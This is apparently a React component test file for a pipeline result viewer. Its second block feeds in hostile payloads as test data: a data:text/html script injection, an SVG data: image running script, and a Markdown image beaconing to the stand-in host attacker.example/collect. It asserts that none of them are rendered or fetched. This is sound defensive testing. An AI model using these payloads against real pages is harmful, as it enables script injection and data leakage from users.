import { describe, it, expect } from "vitest";
import { render, screen, fireEvent } from "@testing-library/react";
import { DOCUMENT_FORMATS, type RunField } from "@pipelex/mthds-form";
import { RunResult } from "./RunResult";
import { requireResultField } from "@/lib/resultField";
import { requireContract } from "@/lib/runInputs";
import { OUTPUT_FORM, PIPE_IO_CONTRACTS } from "@/generated/summarize-pdf/contracts";
import * as generateImage from "@/generated/generate-image/contracts";
import * as textStats from "@/generated/text-stats/contracts";

const CONTRACT = requireContract(PIPE_IO_CONTRACTS, "summarize_pdf", "summarize_pdf");
const FIELD = requireResultField(OUTPUT_FORM, CONTRACT, "summarize_pdf", "summarize_pdf");

const SUMMARY = {
  title: "Q3 invoice",
  doc_type: "invoice",
  key_points: ["Total $1,728", "Due 30 days"],
};

describe("RunResult", () => {
  it("renders the concept's own fields, labelled from the descriptor", () => {
    render(<RunResult field={FIELD} value={SUMMARY} name="document_summary" />);

    // No heading is written here for `Doc type` — the label is the field name
    // the method author wrote, humanized by the kernel's `app` presentation.
    // That is the whole claim: change what the method produces, regenerate, and
    // the view follows with nothing hand-written to keep in step.
    expect(screen.getByText("Doc type")).toBeInTheDocument();
    expect(screen.getByText("invoice")).toBeInTheDocument();
    expect(screen.getByText("Total $1,728")).toBeInTheDocument();
  });

  it("titles the panel with the stuff name the caller supplies", () => {
    // The descriptor's own name is the engine's `output` for every pipe there
    // has ever been — correct in the artifact, wrong on screen. Only the caller
    // knows what the reader is looking at.
    render(<RunResult field={FIELD} value={SUMMARY} name="document_summary" />);

    expect(screen.getByText("Document summary")).toBeInTheDocument();
    expect(screen.queryByText("output")).not.toBeInTheDocument();
  });

  it("offers the payload verbatim beside the rendered view", () => {
    // Two views, and they are not peers: the rendered one is the answer for a
    // person, the JSON one is the receipt for whoever is debugging the pipe.
    // Rendered opens first.
    render(<RunResult field={FIELD} value={SUMMARY} name="document_summary" />);

    expect(screen.getByRole("button", { name: "Result" })).toHaveAttribute("aria-pressed", "true");
    fireEvent.click(screen.getByRole("button", { name: "JSON" }));
    expect(screen.getByText(/"doc_type"/)).toBeInTheDocument();
  });
});

// A run's output is model-shaped data crossing a trust boundary, and the result
// view hands it to the kernel untouched: the kernel's `viewableUrl` gate is the
// only thing between a payload's file URLs and the elements the kernel renders.
// (An HTML result's markup is outside it: the kernel frames that markup under a
// content policy admitting `https:` images, and no case here can see inside the
// frame — see `docs/input-form.md`.) These cases pin the gate at this app's own
// composition, `<RunResult>` with no resolver mounted above it, so a kernel
// release that loosens the gate, or a `proseImages="load"` added here, fails the
// suite. They assert on what a browser would be handed, never on kernel internals.
describe("RunResult — the URLs a run's payload can reach", () => {
  // No shipped method outputs a document, so the field is built by hand.
  const DOCUMENT_FIELD: RunField = {
    kind: "document",
    name: "output",
    required: true,
    formats: DOCUMENT_FORMATS,
  };
  const IMAGE_FIELD = requireResultField(
    generateImage.OUTPUT_FORM,
    requireContract(generateImage.PIPE_IO_CONTRACTS, "generate_image", "generate_image"),
    "generate_image",
    "generate_image",
  );
  const TEXT_FIELD = requireResultField(
    textStats.OUTPUT_FORM,
    requireContract(textStats.PIPE_IO_CONTRACTS, "text_stats", "analyze_text"),
    "text_stats",
    "analyze_text",
  );

  /** Every URL the page hands the browser to fetch, open or frame. */
  function sinkUrls(container: HTMLElement): string[] {
    return [...container.querySelectorAll("[src], [href]")].flatMap((el) =>
      ["src", "href"].flatMap((attr) => el.getAttribute(attr) ?? []),
    );
  }

  function renderResult(field: RunField, value: unknown) {
    return render(<RunResult field={field} value={value} name="output" />);
  }

  it("offers a preview of a document at an https: URL", () => {
    // The positive control for the refusals below: a preview control exists,
    // and a refusal is its absence rather than a label that never rendered. It
    // is not clicked, because the frame would make happy-dom fetch its source.
    renderResult(DOCUMENT_FIELD, {
      url: "https://cdn.example/report.pdf",
      filename: "report.pdf",
      mime_type: "application/pdf",
    });
    expect(screen.getByRole("button", { name: "Preview" })).toBeInTheDocument();
  });

  it("hands a browser no data:text/html document, whatever its filename claims", () => {
    // A `data:` document gets an opaque origin, so it cannot reach this app's cookies or
    // DOM, but framed unsandboxed it would run its script and draw its own UI in the page.
    const { container } = renderResult(DOCUMENT_FIELD, {
      url: "data:text/html,<script>parent.document.title='owned'</script>",
      filename: "report.pdf",
      mime_type: "application/pdf",
    });

    expect(sinkUrls(container).filter((url) => url.startsWith("data:"))).toEqual([]);
    expect(screen.queryByRole("button", { name: "Preview" })).not.toBeInTheDocument();
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("frames no data: document, even one of a type the gate admits", () => {
    // The gate admits a PDF `data:` URL, so this is the framing rule's own
    // refusal, which the `data:text/html` case above never reaches.
    const { container } = renderResult(DOCUMENT_FIELD, {
      url: "data:application/pdf;base64,JVBERi0xLjQK",
      filename: "report.pdf",
      mime_type: "application/pdf",
    });

    expect(screen.queryByRole("button", { name: "Preview" })).not.toBeInTheDocument();
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("paints no SVG data: image, which executes as a document", () => {
    const { container } = renderResult(IMAGE_FIELD, {
      url: "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>",
      mime_type: "image/svg+xml",
    });

    expect(container.querySelector("img")).toBeNull();
    expect(sinkUrls(container).filter((url) => url.startsWith("data:"))).toEqual([]);
  });

  it("renders a Markdown image in a text result as a link, never a fetch on paint", () => {
    const beacon = "https://attacker.example/collect?run=01J";
    const { container } = renderResult(TEXT_FIELD, {
      text: `Here is the chart you asked for: ![chart](${beacon})`,
    });

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "chart" })).toHaveAttribute("href", beacon);
  });

  it("frames no same-origin path the payload names", () => {
    // A path is this app's own origin; framed, an SVG served there is a document
    // with a DOM beside the page. The same file is previewable at an `https:`
    // URL, so the URL's provenance is the only thing that differs.
    const svg = { filename: "x.svg", mime_type: "image/svg+xml" };
    const remote = renderResult(DOCUMENT_FIELD, { ...svg, url: "https://cdn.example/x.svg" });
    expect(screen.getByRole("button", { name: "Preview" })).toBeInTheDocument();
    remote.unmount();

    const { container } = renderResult(DOCUMENT_FIELD, { ...svg, url: "/files/x.svg" });
    expect(screen.queryByRole("button", { name: "Preview" })).not.toBeInTheDocument();
    expect(container.querySelector("iframe")).toBeNull();
  });
});
